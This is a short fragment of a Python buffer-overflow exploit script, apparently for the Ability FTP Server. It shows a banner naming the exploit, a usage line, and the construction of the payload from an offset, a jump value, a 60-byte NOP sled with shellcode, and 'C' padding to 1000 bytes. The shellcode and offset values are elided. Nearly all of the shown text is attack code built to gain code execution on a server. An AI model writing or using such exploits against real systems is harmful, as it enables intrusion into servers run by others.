...
banner = """
#----------------------------------------------#
ability FTP Server Exploit with Shellcode
1. python ability_ftp_server_sc.py
...
bufferandshellcode = "\x90"*60 + shellcode

sploit = offset + nowjump + bufferandshellcode + 'C'*(1000-len(offset+nowjump+bufferandshellcode))
